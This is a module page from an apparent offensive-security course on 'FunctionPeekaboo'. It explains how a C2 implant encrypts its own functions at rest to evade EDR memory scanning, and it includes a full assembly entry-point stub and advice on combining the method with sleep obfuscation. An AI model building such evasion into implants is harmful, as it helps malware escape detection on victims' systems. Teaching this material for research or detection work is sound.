@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: Initialization & Runtime Flow - FunctionPeekaboo Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F441;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#f97316;--accent2:#ef4444;--gradient:linear-gradient(135deg,#f97316,#ef4444)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>FunctionPeekaboo</h2>
+<span>LLVM Self-Masking Functions</span>
+</div>
+<a class="home-link" href="../FunctionPeekaboo_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Memory Scanning &amp; Sleep</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. LLVM Compiler Architecture</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. PE Internals &amp; Sections</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Registration &amp; X86RetModPass</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Prologue &amp; Epilogue Stubs</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. The Handler &amp; XOR Engine</span><span class="diff d3">d3</span></a>
+<a class="mod-link active" href="module7.html"><span>7. Init &amp; Runtime Flow</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Detection, CET &amp; Nighthawk</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: Initialization &amp; Runtime Flow</h1>
+<p class="subtitle">From binary load to encrypted-at-rest &mdash; tracing the complete execution flow from startup through function calls.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Trace the complete runtime lifecycle of a FunctionPeekaboo-instrumented binary: the <code>.stub</code> entry point hijack, initial encryption of all registered functions, the transition to normal program execution, and the steady-state flow of decrypt-on-call and re-encrypt-on-return during operation.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. The Boot Sequence</h2>
+
+<p>When the Windows loader executes the binary, the normal startup sequence is hijacked by FunctionPeekaboo. Here is the complete sequence from process creation to steady-state operation:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Boot Sequence</h4>
+<div class="flow">
+<div class="flow box">OS Loader<br><small>Maps PE sections<br>Resolves imports</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">.stub Init<br><small>Encrypt all funcs<br>Setup TEB</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Original EP<br><small>CRT startup<br>mainCRTStartup()</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">main()<br><small>Application code<br>Self-masking active</small></div>
+</div>
+</div>
+
+<table>
+<tr><th>Step</th><th>What Happens</th><th>State of Registered Functions</th></tr>
+<tr><td>1. PE Loading</td><td>Windows maps the executable into memory, resolves imports, processes relocations</td><td><strong>Cleartext</strong> (as compiled)</td></tr>
+<tr><td>2. Entry Point</td><td>Windows calls <code>AddressOfEntryPoint</code>, which points to <code>.stub</code> (set by <code>modifyEP.py</code>)</td><td><strong>Cleartext</strong></td></tr>
+<tr><td>3. .stub Init</td><td>The stub walks <code>.funcmeta</code> and XOR-encrypts every registered function body</td><td><strong>Transitioning to encrypted</strong></td></tr>
+<tr><td>4. TEB Setup</td><td>The stub initializes TEB UserReserved fields to zero (no active function)</td><td><strong>All encrypted</strong></td></tr>
+<tr><td>5. Jump to Original EP</td><td>The stub jumps to the original entry point (saved during post-processing)</td><td><strong>All encrypted</strong></td></tr>
+<tr><td>6. CRT Initialization</td><td><code>mainCRTStartup</code> runs: initializes heap, stdio, runs static constructors</td><td><strong>All encrypted</strong> (CRT functions are not registered)</td></tr>
+<tr><td>7. main() Entry</td><td>Application code begins executing</td><td><strong>All encrypted</strong> (self-masking active)</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>2. The .stub Initialization Code</h2>
+
+<p>The <code>.stub</code> section contains the initialization routine. Its job is to encrypt all registered functions before any application code runs:</p>
+
+<pre><span class="lang-tag">x86-64 Assembly</span>section .stub
+_peekaboo_init:
+    ; === Prologue: save all registers ===
+    pushfq
+    push    rax
+    push    rbx
+    push    rcx
+    push    rdx
+    push    rsi
+    push    rdi
+    push    r8
+    push    r9
+    push    r10
+    push    r11
+
+    ; === Initialize TEB UserReserved fields ===
+    xor     eax, eax
+    mov     qword ptr gs:[0x1478], rax    ; UserReserved[0] = NULL
+    mov     qword ptr gs:[0x1480], rax    ; UserReserved[1] = 0
+    mov     qword ptr gs:[0x1488], rax    ; UserReserved[2] = 0
+
+    ; === Find image base ===
+    call    .Lgetip
+.Lgetip:
+    pop     rbx                            ; RBX = our address
+    and     rbx, 0xFFFFFFFFFFFF0000        ; Align to 64KB
+.Lscan:
+    cmp     word ptr [rbx], 0x5A4D         ; "MZ"?
+    je      .Lfound
+    sub     rbx, 0x10000
+    jmp     .Lscan
+.Lfound:
+    ; RBX = ImageBase
+
+    ; === Find .funcmeta section ===
+    mov     ecx, [rbx + 0x3C]             ; e_lfanew
+    lea     rdx, [rbx + rcx]              ; PE header
+    movzx   ecx, word ptr [rdx + 6]       ; NumberOfSections
+    movzx   r8d, word ptr [rdx + 20]      ; SizeOfOptionalHeader
+    lea     rsi, [rdx + 24 + r8]          ; First section header
+
+.Lsec_loop:
+    cmp     dword ptr [rsi], 0x6E75662E   ; ".fun"
+    jne     .Lsec_next
+    cmp     dword ptr [rsi+4], 0x74656D63 ; "cmet"
+    je      .Lsec_found
+.Lsec_next:
+    add     rsi, 40
+    dec     ecx
+    jnz     .Lsec_loop
+    jmp     .Ldone                         ; .funcmeta not found, skip
+
+.Lsec_found:
+    mov     ecx, [rsi + 12]               ; .funcmeta VirtualAddress
+    lea     rsi, [rbx + rcx]              ; RSI = .funcmeta data
+
+    ; === Iterate entries and encrypt each function ===
+.Lentry_loop:
+    mov     edi, [rsi]                     ; FunctionRVA
+    test    edi, edi
+    jz      .Ldone                         ; NULL terminator = end
+
+    mov     ecx, [rsi + 4]                ; FunctionSize
+    movzx   eax, byte ptr [rsi + 8]       ; XorKey
+
+    ; Calculate function VA
+    lea     rdi, [rbx + rdi]              ; RDI = function body address
+
+    ; VirtualProtect to RW
+    sub     rsp, 40                        ; Shadow space + oldProtect
+    lea     r9, [rsp + 32]                ; &oldProtect
+    mov     r8d, 0x04                     ; PAGE_READWRITE
+    mov     edx, ecx                      ; Size
+    mov     rcx, rdi                      ; Address
+    call    [VirtualProtect_IAT]
+    add     rsp, 40
+
+    ; XOR encrypt the function body
+    mov     ecx, [rsi + 4]                ; Reload size
+    movzx   eax, byte ptr [rsi + 8]       ; Reload key
+.Lxor:
+    xor     byte ptr [rdi], al
+    inc     rdi
+    dec     ecx
+    jnz     .Lxor
+
+    ; Reload function address for VirtualProtect restore
+    mov     edi, [rsi]
+    lea     rdi, [rbx + rdi]
+
+    ; VirtualProtect back to RX
+    sub     rsp, 40
+    lea     r9, [rsp + 32]
+    mov     r8d, 0x20                     ; PAGE_EXECUTE_READ
+    mov     edx, [rsi + 4]
+    mov     rcx, rdi
+    call    [VirtualProtect_IAT]
+    add     rsp, 40
+
+    ; Mark as encrypted
+    mov     byte ptr [rsi + 9], 1
+
+    ; Next entry
+    add     rsi, 12
+    jmp     .Lentry_loop
+
+.Ldone:
+    ; === Restore all registers ===
+    pop     r11
+    pop     r10
+    pop     r9
+    pop     r8
+    pop     rdi
+    pop     rsi
+    pop     rdx
+    pop     rcx
+    pop     rbx
+    pop     rax
+    popfq
+
+    ; === Jump to original entry point ===
+    jmp     ORIGINAL_ENTRY_POINT          ; Patched by modifyEP.py</pre>
+
+<div class="card">
+<h4>Timing Window</h4>
+<p>Between PE loading (step 1) and <code>.stub</code> initialization (step 3), the functions are briefly in cleartext. This window is extremely short (microseconds), occurring before any user-mode code in the process runs. An EDR would need a very aggressive injection-time scan to catch this window. Once initialization completes, functions remain encrypted until explicitly called.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Steady-State Runtime Flow</h2>
+
+<p>After initialization, the self-masking system operates transparently during normal program execution. Here is a detailed trace of what happens when a peekaboo function is called:</p>
+
+<pre><span class="lang-tag">Text</span>Caller code: call beacon_checkin
+
+Time 0:    beacon_checkin body is ENCRYPTED (XOR'd garbage bytes)
+
+Time 1:    Prologue stub executes:
+           - CALL/POP gets current address
+           - Pushes all registers + flags
+           - Calls handler(func_ptr, DECRYPT)
+
+Time 2:    Handler executes:
+           - Finds PE image base
+           - Parses .funcmeta, finds beacon_checkin entry
+           - VirtualProtect(body, size, PAGE_READWRITE)
+           - XOR decrypts body bytes
+           - VirtualProtect(body, size, PAGE_EXECUTE_READ)
+           - Sets IsEncrypted = 0
+           - Stores func_ptr in TEB UserReserved[0]
+
+Time 3:    Prologue stub continues:
+           - Pops all registers + flags
+           - Falls through to now-decrypted function body
+
+Time 4:    beacon_checkin body executes NORMALLY
+           (all original instructions run as compiled)
+
+Time 5:    beacon_checkin reaches a RET instruction
+           Epilogue stub executes:
+           - Pushes all registers + flags
+           - Calls handler(func_ptr, ENCRYPT)
+
+Time 6:    Handler executes:
+           - VirtualProtect(body, size, PAGE_READWRITE)
+           - XOR encrypts body bytes
+           - VirtualProtect(body, size, PAGE_EXECUTE_READ)
+           - Sets IsEncrypted = 1
+           - Clears TEB UserReserved[0]
+
+Time 7:    Epilogue stub continues:
+           - Pops all registers + flags
+           - Executes RET (returns to caller)
+
+Time 8:    beacon_checkin body is ENCRYPTED again</pre>
+
+<!-- ============================================================ -->
+<h2>4. Function Call Chains</h2>
+
+<p>Real programs involve deep call chains. Here is how FunctionPeekaboo handles nested calls between instrumented functions:</p>
+
+<div class="card green">
+<h4>Nested Call Example</h4>
+<pre><span class="lang-tag">Text</span>main() calls func_A() calls func_B() calls func_C()
+(only func_A and func_C are peekaboo-registered)
+
+Step 1: main calls func_A
+  - func_A prologue: DECRYPT func_A
+  - State: func_A=clear, func_B=N/A, func_C=encrypted
+
+Step 2: func_A calls func_B (NOT registered)
+  - No prologue/epilogue stubs
+  - func_B runs normally
+  - State: func_A=clear, func_C=encrypted
+
+Step 3: func_B calls func_C
+  - func_C prologue: DECRYPT func_C
+  - State: func_A=clear, func_C=clear (2 decrypted)
+
+Step 4: func_C returns to func_B
+  - func_C epilogue: ENCRYPT func_C
+  - State: func_A=clear, func_C=encrypted
+
+Step 5: func_B returns to func_A
+  - No epilogue (func_B not registered)
+  - State: func_A=clear, func_C=encrypted
+
+Step 6: func_A returns to main
+  - func_A epilogue: ENCRYPT func_A
+  - State: all encrypted</pre>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Thread Safety</h2>
+
+<p>In a multithreaded implant, different threads may call different peekaboo functions simultaneously. The handler must be thread-safe:</p>
+
+<table>
+<tr><th>Concern</th><th>How FunctionPeekaboo Handles It</th></tr>
+<tr><td><strong>TEB state</strong></td><td>Per-thread (each thread has its own TEB via GS), no shared state for tracking</td></tr>
+<tr><td><strong>.funcmeta writes</strong></td><td>The <code>IsEncrypted</code> flag is a single byte, and byte writes are atomic on x86. However, two threads calling the same function simultaneously is a race condition</td></tr>
+<tr><td><strong>Same function, two threads</strong></td><td>If thread A decrypts func_X and thread B also needs func_X, thread B sees it already decrypted (IsEncrypted=0) and skips decryption. But if thread A re-encrypts while B is still executing, corruption occurs</td></tr>
+<tr><td><strong>VirtualProtect</strong></td><td>Affects the entire process (memory permissions are per-page, not per-thread). Changes by one thread are visible to all</td></tr>
+</table>
+
+<div class="card warn">
+<h4>The Thread Race Problem</h4>
+<p>The most critical thread safety issue: if two threads call the <em>same</em> peekaboo function, thread A might re-encrypt it (on return) while thread B is still executing it. The simplest mitigation is a <strong>reference counter</strong> per function in .funcmeta &mdash; only re-encrypt when the counter reaches zero. The PoC may not fully address this; production implementations like Nighthawk use more sophisticated synchronization.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Exception Handling Considerations</h2>
+
+<p>If a peekaboo function throws an exception (C++ exception, SEH, or hardware exception), the normal return path is bypassed. The epilogue stub never runs, leaving the function decrypted:</p>
+
+<div class="card">
+<h4>Exception Scenarios</h4>
+<table>
+<tr><th>Exception Type</th><th>Impact</th><th>Mitigation</th></tr>
+<tr><td><strong>C++ throw</strong></td><td>Stack unwinding skips the epilogue stub</td><td>Register an SEH handler in the prologue that re-encrypts on unwind</td></tr>
+<tr><td><strong>SEH exception</strong></td><td>If caught by a handler in a parent frame, epilogue is skipped</td><td>Use <code>__finally</code> blocks or custom unwind handlers</td></tr>
+<tr><td><strong>Access violation</strong></td><td>Process may terminate; re-encryption irrelevant</td><td>None needed (process is dying)</td></tr>
+<tr><td><strong>VEH handler</strong></td><td>Vectored exception handler might resume execution; function stays decrypted</td><td>VEH handler should check TEB state and re-encrypt if needed</td></tr>
+</table>
+</div>
+
+<p>The PoC FunctionPeekaboo focuses on the happy path. A production implementation would register unwind handlers to ensure re-encryption even on exceptional control flow paths.</p>
+
+<!-- ============================================================ -->
+<h2>7. Integration with Sleep Obfuscation</h2>
+
+<p>FunctionPeekaboo and sleep obfuscation can be combined for maximum coverage:</p>
+
+<pre><span class="lang-tag">Text</span>Combined Protection Timeline:
+
+Active Phase (checking in, executing commands):
+  FunctionPeekaboo: ~98% of code encrypted (only active function decrypted)
+  Sleep obfuscation: not active (implant is awake)
+  Net coverage: ~98%
+
+Sleep Phase (waiting between check-ins):
+  FunctionPeekaboo: 100% encrypted (no function executing)
+  Sleep obfuscation: 100% encrypted (entire image masked)
+  Net coverage: 100% (double encrypted)
+
+Result: At no point is more than ~2% of code in cleartext</pre>
+
+<div class="card green">
+<h4>Layered Defense</h4>
+<p>Using both techniques together means the implant has strong protection in both active and passive states. Sleep obfuscation handles the sleep window, and FunctionPeekaboo handles the active window. The ~2% gap during active execution represents only the single function currently running &mdash; a very small signature surface for any scanner to catch.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Debugging FunctionPeekaboo Binaries</h2>
+
+<p>Debugging is more complex because function bodies are encrypted at rest. When you set a breakpoint in a debugger, the breakpoint address might contain encrypted garbage:</p>
+
+<div class="card">
+<h4>Debugging Tips</h4>
+<ul>
+<li><strong>Break on the prologue stub</strong>: Set breakpoints at function entry (before the first instruction of the stub). The stub is never encrypted &mdash; only the body is.</li>
+<li><strong>Break after decryption</strong>: Set a breakpoint on the handler&rsquo;s return. At that point, the function body is decrypted and you can inspect it normally.</li>
+<li><strong>Disable masking for debugging</strong>: Remove the <code>peekaboo</code> attribute from the function you want to debug, recompile.</li>
+<li><strong>Single-step through stubs</strong>: Use single-stepping (F11/step-into) through the prologue to watch the decryption happen in real-time.</li>
+<li><strong>Inspect .funcmeta</strong>: Dump the <code>.funcmeta</code> section to see which functions are registered and their current encryption state.</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<h2>9. Performance Profiling</h2>
+
+<table>
+<tr><th>Operation</th><th>Typical Latency</th><th>Notes</th></tr>
+<tr><td>Prologue stub (register save)</td><td>~10ns</td><td>Push instructions, fast</td></tr>
+<tr><td>Handler: PE parsing</td><td>~50ns</td><td>Memory reads, cached after first call</td></tr>
+<tr><td>Handler: .funcmeta lookup</td><td>~20ns</td><td>Linear scan, typically &lt;20 entries</td></tr>
+<tr><td>Handler: VirtualProtect (RX&rarr;RW)</td><td>~1-5&mu;s</td><td>System call, dominates total time</td></tr>
+<tr><td>Handler: XOR loop (1KB function)</td><td>~100ns</td><td>Fast, memory-bound</td></tr>
+<tr><td>Handler: VirtualProtect (RW&rarr;RX)</td><td>~1-5&mu;s</td><td>Second system call</td></tr>
+<tr><td>Epilogue stub (register restore)</td><td>~10ns</td><td>Pop instructions, fast</td></tr>
+<tr><td><strong>Total per call+return</strong></td><td><strong>~4-20&mu;s</strong></td><td>Dominated by VirtualProtect syscalls</td></tr>
+</table>
+
+<p>For a C2 beacon that checks in every 60 seconds, a 20&mu;s overhead per function call is completely negligible. Even with dozens of peekaboo functions called per check-in cycle, the total overhead is under 1ms &mdash; invisible to the user and the C2 framework.</p>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: When are all registered functions first encrypted?</p>
+<div class="quiz-btn" data-choice="A">A) At compile time by the LLVM backend</div>
+<div class="quiz-btn" data-choice="B">B) At runtime by the .stub initialization code, before the CRT runs</div>
+<div class="quiz-btn" data-choice="C">C) When the first function is called</div>
+<div class="quiz-btn" data-choice="D">D) During the modifyEP.py post-processing step</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: What is the main thread safety risk with FunctionPeekaboo?</p>
+<div class="quiz-btn" data-choice="A">A) TEB fields are shared between threads</div>
+<div class="quiz-btn" data-choice="B">B) VirtualProtect only works on the main thread</div>
+<div class="quiz-btn" data-choice="C">C) Two threads calling the same function can race: one re-encrypts while the other is still executing</div>
+<div class="quiz-btn" data-choice="D">D) The XOR engine is not thread-safe</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: What dominates the per-function-call performance overhead?</p>
+<div class="quiz-btn" data-choice="A">A) VirtualProtect system calls (~1-5&mu;s each, two per operation)</div>
+<div class="quiz-btn" data-choice="B">B) The XOR encryption loop</div>
+<div class="quiz-btn" data-choice="C">C) PE header parsing</div>
+<div class="quiz-btn" data-choice="D">D) Register save/restore in the stubs</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module6.html">&larr; Previous: The Handler &amp; XOR Engine</a>
+<a class="primary" href="module8.html">Next: Detection, CET &amp; Nighthawk &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
